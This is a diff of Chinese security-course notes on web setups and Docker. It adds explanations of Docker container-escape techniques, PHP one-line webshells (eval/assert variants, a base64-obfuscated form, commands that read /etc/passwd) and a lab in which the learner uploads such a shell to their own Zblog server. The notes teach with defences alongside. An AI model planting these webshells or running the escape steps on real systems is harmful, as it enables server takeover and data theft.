@@ -24,19 +24,101 @@ Day02 基础入门-Web架构&前后端分离站&Docker容器&集成软件站&建
 原理：打包类集成化环境，权限配置或受控制  
 影响：黑客攻击虚拟空间磁盘  
 警告：Docker 容器逃逸！  
->常见的逃逸方式及原理
->1.	内核漏洞利用：  
->	由于容器共享宿主机内核，如果宿主机内核存在漏洞，攻击者在容器内可以通过特定的漏洞利用代码，绕过容器的隔离机制，获取到宿主机的更高权限，进而实现逃逸。例如，某些影响内核内存管理的漏洞，攻击者可以构造恶意的内存访问操作，打破容器边界，访问宿主机的文件系统、执行宿主机上的命令等。  
->	像曾经出现的一些知名内核漏洞（如脏牛漏洞等），若相关系统未及时修复，在有 Docker 容器运行的场景下，容器内的恶意用户就可能借助其突破容器限制，对宿主机产生威胁。
->2.	挂载卷漏洞：  
->	Docker 允许将宿主机的目录挂载到容器内，方便数据共享和持久化存储等操作。但如果对挂载卷的配置不当，比如配置了过高的权限，攻击者在容器内就可以通过挂载卷访问到宿主机的对应目录，进而篡改宿主机上的文件、获取敏感信息等，实现逃逸。  
->	例如，将宿主机的根目录以可写权限挂载到容器内，容器内的恶意程序就可以随意修改宿主机的关键文件，破坏宿主机系统的正常运行，甚至获取宿主机的控制权。  
->3.	Docker 配置错误：  
->	若在配置 Docker 时，没有正确设置安全选项，比如允许容器以特权模式运行（特权模式下容器拥有几乎等同于宿主机的权限），那么攻击者一旦进入容器，就相当于直接获得了宿主机的高权限，可以毫无阻碍地进行各种恶意操作，轻松实现逃逸。    
->	另外，对于容器的网络配置，如果没有做好隔离，使得容器可以轻易访问到宿主机的网络接口等关键资源，也可能被利用来突破容器边界，达到逃逸目的。    
->4. 容器内应用漏洞：    
->	当容器内运行的应用（如 Web 应用程序等）存在安全漏洞，像常见的 SQL 注入、命令注入等漏洞，攻击者可以先利用这些漏洞在容器内获取一定的控制权，然后进一步寻找容器环境的薄弱点，借助一些特定的技巧（比如利用容器内的工具链构造恶意命令等）来突破容器的隔离，逃逸到宿主机或其他容器中。  
->	例如，容器内的一个存在命令注入漏洞的 Web 应用，攻击者通过注入恶意命令，先获取容器内的 shell 权限，再利用容器内可获取的一些关于 Docker 环境的信息，尝试突破容器限制，对外部环境造成危害。
+**Docker容器逃逸**是指攻击者通过某种方式突破容器的隔离环境，获取宿主机的权限或访问宿主机资源的行为。容器逃逸是一种严重的安全威胁，可能导致宿主机上的其他容器或系统受到攻击。
+
+### 容器逃逸的原因
+Docker容器逃逸通常由以下原因引起：
+1. **配置不当**：
+   - 容器以特权模式（`--privileged`）运行。
+   - 挂载敏感目录（如`/`、`/proc`、`/dev`）。
+   - 使用不安全的Capabilities（如`CAP_SYS_ADMIN`）。
+2. **内核漏洞**：
+   - 利用Linux内核漏洞（如脏牛漏洞、CVE-2022-0847）突破容器隔离。
+3. **Docker漏洞**：
+   - 利用Docker本身的漏洞（如CVE-2019-5736）逃逸容器。
+4. **共享命名空间**：
+   - 容器与宿主机共享命名空间（如PID、网络、IPC）。
+5. **恶意镜像**：
+   - 使用包含恶意代码的镜像，导致容器被攻击。
+
+### 常见的容器逃逸方法
+1. **特权模式逃逸**：
+   - 如果容器以特权模式运行，攻击者可以挂载宿主机文件系统并修改关键文件。
+   - 示例：
+     ```bash
+     docker run --privileged -it ubuntu
+     ```
+     在容器内挂载宿主机文件系统：
+     ```bash
+     mkdir /mnt/host
+     mount /dev/sda1 /mnt/host
+     ```
+2. **挂载敏感目录逃逸**：
+   - 如果容器挂载了敏感目录（如`/proc`、`/sys`），攻击者可以通过修改这些目录中的文件逃逸。
+   - 示例：
+     
+     docker run -v /proc:/host_proc -it ubuntu
+     
+     在容器内修改`/host_proc/sys/kernel/core_pattern`，执行宿主机命令。
+3. **利用内核漏洞逃逸**：
+   - 利用Linux内核漏洞（如脏牛漏洞）突破容器隔离。
+4. **Docker漏洞逃逸**：
+   - 利用Docker本身的漏洞逃逸容器。
+   - 示例：
+     - CVE-2019-5736：通过覆盖`/proc/self/exe`逃逸容器。
+5. **共享命名空间逃逸**：
+   - 如果容器与宿主机共享命名空间（如PID命名空间），攻击者可以访问宿主机的进程。
+   - 示例：
+     
+     docker run --pid=host -it ubuntu
+     
+     在容器内查看宿主机进程：
+     
+     ps aux
+
+6. **恶意镜像逃逸**：
+   - 使用包含恶意代码的镜像，攻击者可以在容器内执行逃逸操作。
+   - 示例：
+     - 镜像中包含后门或恶意脚本，用于逃逸容器。
+### 防御措施
+1. **避免使用特权模式**：
+   - 除非必要，否则不要以特权模式运行容器。
+   - 示例：
+     
+     docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE -it ubuntu
+     
+
+2. **限制Capabilities**：
+   - 仅授予容器必要的Capabilities。
+   - 示例：
+     
+     docker run --cap-drop=ALL --cap-add=CHOWN -it ubuntu
+     
+
+3. **避免挂载敏感目录**：
+   - 不要将宿主机的敏感目录挂载到容器中。
+   - 示例：
+     
+     docker run -v /data:/app/data -it ubuntu
+     
+
+4. **更新内核和Docker**：
+   - 定期更新Linux内核和Docker，修复已知漏洞。
+
+5. **使用安全镜像**：
+   - 仅使用可信来源的镜像，并定期扫描镜像中的漏洞。
+
+6. **启用Seccomp和AppArmor**：
+   - 使用Seccomp和AppArmor限制容器的系统调用和文件访问。
+   - 示例：
+     
+     docker run --security-opt seccomp=/path/to/seccomp/profile.json -it ubuntu
+     
+
+7. **监控容器行为**：
+   - 使用监控工具（如Falco）检测容器的异常行为。
+
+
 
 #宝塔或Phpstudy
 -
@@ -61,13 +143,114 @@ Tip：伪静态-动态转为静态技术
 
 >其实现原理主要是借助服务器端的相关模块或配置，当用户访问改写后的伪静态 URL 时，服务器会根据预设的规则将该 URL 解析还原成对应的动态网页请求，然后按照正常的动态网页处理流程，如执行脚本代码、查询数据库等操作，生成相应的网页内容并返回给用户。例如，原本一个动态网页的 URL 可能是```example.com/index.php?id=123```，经过伪静态处理后变成了```example.com/article/123.html```，从形式上看更简洁、更符合搜索引擎友好以及用户友好的特点。
 
+
+PHP一句话木马
+-
+### **PHP一句话木马的基本形式**
+PHP一句话木马的核心是利用PHP的 `eval()` 函数或类似功能，执行用户输入的任意代码。以下是一个典型的一句话木马示例：
+
+```php
+<?php @eval($_POST['cmd']); ?>
+```
+
+#### 解释：
+1. `<?php ... ?>`：PHP代码的起始和结束标记。
+2. `@`：错误抑制符，用于隐藏可能的错误信息，增加隐蔽性。
+3. `eval()`：PHP函数，用于执行字符串形式的PHP代码。
+4. `$_POST['cmd']`：从HTTP POST请求中获取名为 `cmd` 的参数值。
+5. 攻击者可以通过发送POST请求，将任意PHP代码传递给 `cmd` 参数，服务器会执行这些代码。
+
+---
+
+### **一句话木马的使用方式**
+1. **上传木马文件**：
+   - 攻击者通过文件上传漏洞或其他方式，将一句话木马文件上传到目标服务器。
+   - 例如，将上述代码保存为 `shell.php` 并上传到服务器。
+
+2. **连接木马**：
+   - 攻击者使用工具（如中国菜刀、蚁剑、Cknife等）或手动发送HTTP请求与木马文件交互。
+   - 例如，发送POST请求：
+     ```http
+     POST /shell.php HTTP/1.1
+     Host: example.com
+     Content-Type: application/x-www-form-urlencoded
+     ```
+     cmd=echo 'Hello, World!';
+     
+
+3. **执行任意代码**：
+   - 攻击者可以通过 `cmd` 参数执行任意PHP代码，例如：
+     - 查看文件：`cmd=print_r(scandir('.'));`
+     - 读取文件：`cmd=echo file_get_contents('/etc/passwd');`
+     - 执行系统命令：`cmd=system('whoami');`
+
+---
+
+### **一句话木马的变种**
+为了绕过安全检测，攻击者会对一句话木马进行各种变形。以下是一些常见的变种：
+
+#### 1. **使用 `assert()` 函数**
+```php
+<?php @assert($_POST['cmd']); ?>
+```
+
+#### 2. **使用 `create_function()` 函数**
+```php
+<?php $func = create_function('', $_POST['cmd']); $func(); ?>
+``
+
+#### 3. **使用 `preg_replace()` 函数**
+```php
+<?php @preg_replace('/.*/e', $_POST['cmd'], ''); ?>
+```
+
+#### 4. **使用 `file_put_contents()` 函数**
+```php
+<?php @file_put_contents('shell.php', $_POST['cmd']); ?>
+```
+
+#### 5. **加密或编码**
+```php
+<?php eval(base64_decode('ZXZhbCgkX1BPU1RbJ2NtZCddKTs=')); ?>
+```
+- 解码后：`eval($_POST['cmd']);`
+
+---
+
+### **防御措施**
+1. **禁用危险函数**：
+   - 在 `php.ini` 中禁用 `eval()`、`assert()`、`create_function()` 等危险函数。
+   - 示例：
+     ```ini
+     disable_functions = eval,assert,create_function,preg_replace
+     ```
+
+2. **文件上传检查**：
+   - 对上传的文件进行严格的类型检查和内容扫描。
+   - 禁止上传可执行文件（如 `.php`、`.jsp` 等）。
+
+3. **输入过滤**：
+   - 对所有用户输入进行严格的过滤和验证，避免直接执行用户输入的内容。
+
+4. **Web应用防火墙（WAF）**：
+   - 使用WAF检测和拦截恶意请求。
+
+5. **定期扫描**：
+   - 定期扫描服务器文件，查找可疑文件。
+
+6. **最小权限原则**：
+   - Web服务器运行用户应具有最小权限，避免攻击者获取系统控制权。
+
+
+
+
 实战
 -
 在Windows Server 2012安装宝塔。  
 宝塔可以一键安装中间件，以及Web应用程序。
 
 在Fedora上搭建Zblog php应用程序， 并进行php一句话木马测试。
--
+
 ### 1.	安装Fedora Workstation  
 >https://fedoraproject.org/  
 >选择``Workstation``版本    
@@ -123,12 +306,6 @@ chmod -R 777 /var/www/html/zblog
 ```php 
 <?php @eval($_POST['cmd']); ?>
 ```
->?php……?：这是 PHP 代码的起始和结束标记，用于界定 PHP 代码段，告知服务器该部分内容需要按照 PHP 语言的语法规则进行解析处理。  
-
->@eval()：“eval” 函数是 PHP 中的一个强大且危险的函数，它的作用是将传入的字符串当作有效的 PHP 代码来执行。前面的 “@” 符号是 PHP 中的错误抑制符，用于屏蔽可能出现的错误信息，使得攻击者在执行恶意代码时尽量不暴露相关错误提示，增加隐蔽性。  
-
->$_POST['pass']：这是从 HTTP POST 请求中获取名为 “pass” 的变量值的方式。也就是说，攻击者会通过发送一个 POST 请求到包含这句代码的 PHP 文件所在的页面，并且在请求中携带名为 “pass” 的参数，其参数值就是攻击者想要执行的恶意 PHP 代码内容。
-
 ### 14.木马实验
 >把php木马保存到你能找到的地方，并将其上传到服务器，在浏览器运行  
 点击目标>添加 输入URL，有效载荷选择PhpDynamicPayload， 加密器选择PHP_EVAL_XOR_BASE64.  
@@ -185,17 +362,42 @@ Environment="HTTPS_PROXY=http://127.0.0.1:7890/"
 sudo systemctl daemon-reload
 sudo systemctl restart docker
 ```
-### 5.  查看已经下载的镜像。
-```bash
-docker images
-```
-### 6.	在```hub.docker.com```查看可用的镜像。
+
+### 5.	在```hub.docker.com```查看可用的镜像。
 该网站已被GFW，请自备梯子。
-### 7.	在hub.docker.com随便找一个镜像，可以查看命令，例如wordpress，可以使用（docker pull wordpress）拉取镜像,注意Image是镜像，当你每次运行一个实例，这个叫做容器
-### 9.	可以使用（docker ps -a）来查看所有的“容器”，不管是正在运行的还是已经停止的。
-### 10.	可以使用（docker stop id）停止容器
-### 11.	可以使用（docker rm id）删除容器
-### 12.	可以使用（docker rmi id）删除镜像
+
+### 6.   docker 命令
+转自https://www.runoob.com/docker/docker-container-usage.html
+
+以下是常用的 Docker 客户端命令：
+|命令	|功能|示例|
+|-----|----|---|
+|docker run|	启动一个新的容器并运行命令|	docker run -d ubuntu|
+|docker ps|	列出当前正在运行的容器|	docker ps|
+|docker ps -a|	列出所有容器（包括已停止的容器）|	docker ps -a|
+|docker build|	使用 Dockerfile 构建镜像|	docker build -t my-image |.
+|docker images|	列出本地存储的所有镜像|	docker images|
+|docker pull|	从 Docker 仓库拉取镜像|	docker pull ubuntu|
+|docker push|	将镜像推送到 Docker 仓库|	docker push my-image|
+|docker exec|	在运行的容器中执行命令|	docker exec -it container_name bash|
+|docker stop|	停止一个或多个容器|	docker stop container_name|
+|docker start|	启动已停止的容器|	docker start container_name|
+|docker restart|	重启一个容器|	docker restart container_name|
+|docker rm|	删除一个或多个容器|	docker rm container_name|
+|docker rmi|	删除一个或多个镜像|	docker rmi my-image|
+|docker logs|	查看容器的日志|	docker logs container_name|
+|docker inspect|	获取容器或镜像的详细信息|	docker inspect container_name|
+|docker exec -it|	进入容器的交互式终端|	docker exec -it container_name /bin/bash|
+|docker network ls|	列出所有 Docker 网络|	docker network ls|
+|docker volume ls|	列出所有 Docker 卷|	docker volume ls|
+|docker-compose up|	启动多容器应用（从 docker-compose.yml 文件）|	docker-compose up|
+|docker-compose down|	停止并删除由 docker-compose 启动的容器、网络等	|docker-compose down|
+|docker info|	显示 Docker 系统的详细信息|	docker info|
+|docker version|	显示 Docker 客户端和守护进程的版本信息|	docker version|
+|docker stats|	显示容器的实时资源使用情况|	docker stats|
+|docker login|	登录 Docker 仓库	|docker login|
+|docker logout|	登出 Docker 仓库|	docker logout|
+
 
 Docker compose
 -
